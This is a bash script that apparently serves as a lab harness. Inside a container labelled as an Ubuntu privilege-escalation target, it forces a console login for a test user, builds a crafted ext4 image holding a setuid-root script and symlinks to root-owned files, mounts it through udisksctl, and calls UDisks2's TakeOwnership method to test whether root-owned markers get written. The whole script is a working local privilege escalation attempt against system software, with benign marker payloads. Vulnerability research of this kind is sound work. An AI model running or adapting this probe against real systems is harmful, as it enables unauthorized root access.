#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"
workspace="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log="$workspace/logs/active-udisks-takeownership.out"
mkdir -p "$workspace/logs"

docker exec -i "$container" bash -s >"$log" 2>&1 <<'EOS'
set -Eeuo pipefail

name=active-udisks-takeownership
tmp="/tmp/$name"
home="/home/selfauth/$name"
root_decoy="/root/${name}-decoy"
root_marker="/root/${name}-root"
run_marker="/run/${name}-root"
tmp_marker="/tmp/${name}-user"

cleanup_target() {
  set +e
  findmnt -rn -o TARGET | grep -E '^/media/selfauth/(TAKEOWN|active-udisks-takeownership)' |
    sort -r | xargs -r -n1 umount >/dev/null 2>&1 || true
  losetup -a | awk -F: '/active-udisks-takeownership/ {print $1}' |
    xargs -r -n1 losetup -d >/dev/null 2>&1 || true
  loginctl terminate-user selfauth >/dev/null 2>&1 || true
  systemctl start getty@tty1.service >/dev/null 2>&1 || true
  rm -f /home/selfauth/.bash_profile
  rm -rf "$home" "$tmp" "$root_marker" "$run_marker" "$tmp_marker" "$root_decoy"
  systemctl reset-failed udisks2.service systemd-udevd.service getty@tty1.service >/dev/null 2>&1 || true
}
trap cleanup_target EXIT

rm -rf "$tmp" "$home" "$root_marker" "$run_marker" "$tmp_marker" "$root_decoy"
mkdir -p "$tmp" "$home"
chmod 1777 "$tmp"

id attacker >/dev/null 2>&1 || useradd -m -s /bin/bash attacker
id selfauth >/dev/null 2>&1 || useradd -m -s /bin/bash selfauth
echo selfauth:selfauth | chpasswd
usermod -G selfauth selfauth
chown -R selfauth:selfauth "$home"
printf 'root-owned decoy before TakeOwnership\n' >"$root_decoy"
chmod 0600 "$root_decoy"
chown root:root "$root_decoy"

{
  echo "active UDisks TakeOwnership trust-boundary probe"
  date --iso-8601=seconds
  echo
  echo "## target/default proof"
  sed -n '1,8p' /etc/os-release
  uname -a
  id attacker
  id selfauth
  dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' \
    udisks2 libudisks2-0 e2fsprogs util-linux polkitd systemd udev 2>&1 | sort
  echo

  echo "## service and policy proof"
  systemctl is-enabled udisks2.service 2>&1 || true
  systemctl is-active udisks2.service 2>&1 || true
  systemctl cat udisks2.service 2>&1 | sed -n '1,80p'
  echo
  nl -ba /usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy |
    sed -n '/org.freedesktop.udisks2.loop-setup/,+75p'
  nl -ba /usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy |
    sed -n '/org.freedesktop.udisks2.filesystem-mount"/,+75p'
  nl -ba /usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy |
    sed -n '/org.freedesktop.udisks2.filesystem-take-ownership/,+75p'
  echo

  echo "## helper/config path proof"
  for p in /usr/libexec/udisks2/udisksd /usr/sbin/debugfs /usr/sbin/mkfs.ext4 \
    /usr/bin/udisksctl /usr/bin/gdbus /media /media/selfauth "$root_decoy"; do
    if [ -e "$p" ] || [ -L "$p" ]; then
      stat -Lc '%A %a %U:%G %F %n -> %N' "$p" 2>&1 || true
    else
      echo "MISSING $p"
    fi
  done
} >"$tmp/root-prep.out" 2>&1

cat >"$home/probe.sh" <<'SH'
#!/bin/bash
set +e
name=active-udisks-takeownership
home="/home/selfauth/$name"
out="/tmp/$name/user.out"
exec >"$out" 2>&1

root_decoy="/root/${name}-decoy"
root_marker="/root/${name}-root"
run_marker="/run/${name}-root"
tmp_marker="/tmp/${name}-user"

echo "## active selfauth session"
id
tty
echo "XDG_SESSION_ID=${XDG_SESSION_ID:-}"
if [ -n "${XDG_SESSION_ID:-}" ]; then
  loginctl show-session "$XDG_SESSION_ID" -p Id -p User -p Name -p Seat -p TTY -p Active -p State -p Type -p Class -p Remote
fi
echo

img="$home/active-udisks-takeownership.img"
payload="$home/payload.txt"
printf 'attacker payload\n' >"$payload"
cat >"$home/runme.sh" <<EOF
#!/bin/sh
id > "$root_marker" 2>/dev/null || true
id > "$run_marker" 2>/dev/null || true
id > "$tmp_marker" 2>/dev/null || true
EOF
chmod 4755 "$home/runme.sh"

echo "## build attacker-controlled ext4 image"
truncate -s 64M "$img"
mkfs.ext4 -q -F -L TAKEOWN "$img"
debugfs -w -R "mkdir /attacker_dir" "$img"
debugfs -w -R "write $payload /attacker_dir/payload.txt" "$img"
debugfs -w -R "write $home/runme.sh /attacker_dir/runme.sh" "$img"
debugfs -w -R "sif /attacker_dir/runme.sh mode 0104755" "$img"
debugfs -w -R "symlink /attacker_dir/link_to_root_decoy $root_decoy" "$img"
debugfs -w -R "symlink /attacker_dir/link_to_run_marker $run_marker" "$img"
debugfs -R "ls -l /attacker_dir" "$img"
blkid -p -o export "$img" 2>&1 || true
ls -l "$img"
echo

echo "## active loop setup"
setup="$(udisksctl loop-setup -f "$img" --no-user-interaction 2>&1)"
echo "$setup"
dev="$(printf '%s\n' "$setup" | sed -n 's/.* as \(\/dev\/loop[0-9]\+\).*/\1/p' | tail -1)"
echo "dev=$dev"
udevadm settle --timeout=15 2>&1 || true
if [ -n "$dev" ]; then
  udevadm info --query=property --name "$dev" 2>&1 | grep -E '^(DEVLINKS|ID_FS|ID_LOOP|SYSTEMD|UDISKS)' | sort || true
fi
echo

obj="/org/freedesktop/UDisks2/block_devices/$(basename "$dev")"
echo "## Filesystem interface"
gdbus introspect --system --dest org.freedesktop.UDisks2 --object-path "$obj" |
  sed -n '/interface org.freedesktop.UDisks2.Filesystem/,/};/p'
echo

echo "## active mount"
mout="$(udisksctl mount -b "$dev" --no-user-interaction 2>&1)"
echo "$mout"
mp="$(printf '%s\n' "$mout" | sed -n 's/^Mounted .* at //p' | sed 's/\.$//' | tail -1)"
echo "mountpoint=$mp"
if [ -n "$mp" ] && findmnt "$mp" >/dev/null 2>&1; then
  findmnt -no TARGET,SOURCE,FSTYPE,OPTIONS "$mp" 2>&1 || true
  stat -c '%A %a %U:%G %n' "$mp" "$mp/attacker_dir" "$mp/attacker_dir/payload.txt" "$mp/attacker_dir/link_to_root_decoy" 2>&1 || true
  readlink "$mp/attacker_dir/link_to_root_decoy" 2>&1 || true
  "$mp/attacker_dir/runme.sh" 2>&1 || true
fi
echo

echo "## TakeOwnership calls"
for opts in \
  "{'auth.no_user_interaction': <true>}" \
  "{}"; do
  echo "### options=$opts"
  timeout 20 gdbus call --system --dest org.freedesktop.UDisks2 --object-path "$obj" \
    --method org.freedesktop.UDisks2.Filesystem.TakeOwnership "$opts" 2>&1
  echo "takeownership_rc=$?"
done
echo

echo "## post-TakeOwnership filesystem state"
if [ -n "$mp" ] && findmnt "$mp" >/dev/null 2>&1; then
  findmnt -no TARGET,SOURCE,FSTYPE,OPTIONS "$mp" 2>&1 || true
  stat -c '%A %a %U:%G %n -> %N' "$mp" "$mp/attacker_dir" "$mp/attacker_dir/payload.txt" "$mp/attacker_dir/runme.sh" \
    "$mp/attacker_dir/link_to_root_decoy" "$mp/attacker_dir/link_to_run_marker" 2>&1 || true
  ls -la "$mp/attacker_dir" 2>&1 || true
  "$mp/attacker_dir/runme.sh" 2>&1 || true
  ls -l "$root_marker" "$run_marker" "$tmp_marker" 2>&1 || true
  udisksctl unmount -b "$dev" --no-user-interaction 2>&1 || umount "$mp" 2>&1 || true
fi
echo

echo "## loop cleanup as active user"
udisksctl loop-delete -b "$dev" --no-user-interaction 2>&1 || true
SH

chmod 0755 "$home/probe.sh"
chown -R selfauth:selfauth "$home"
cat >/home/selfauth/.bash_profile <<'SH'
/home/selfauth/active-udisks-takeownership/probe.sh
exit
SH
chown selfauth:selfauth /home/selfauth/.bash_profile

systemctl stop getty@tty1.service >/dev/null 2>&1 || true
timeout 180 openvt -c 1 -s -f -w -- /bin/login -f selfauth || true
systemctl start getty@tty1.service >/dev/null 2>&1 || true
loginctl terminate-user selfauth >/dev/null 2>&1 || true
rm -f /home/selfauth/.bash_profile
udevadm settle --timeout=20 >/dev/null 2>&1 || true

cat "$tmp/root-prep.out"
echo
cat "$tmp/user.out" 2>&1 || true
echo
echo "## root-side postcheck"
for p in "$root_decoy" "$root_marker" "$run_marker" "$tmp_marker"; do
  stat -Lc '%A %a %U:%G %n -> %N' "$p" 2>&1 || true
  [ -f "$p" ] && sed -n '1,3p' "$p" 2>&1 || true
done
echo "ROOT_PROOF=$(test -e "$root_marker" && echo yes || echo no)"
journalctl -b --no-pager -u udisks2.service -g 'take ownership|TakeOwnership|active-udisks-takeownership|filesystem-take-ownership|NotAuthorized' -n 120 2>&1 || true
EOS

echo "wrote $log"
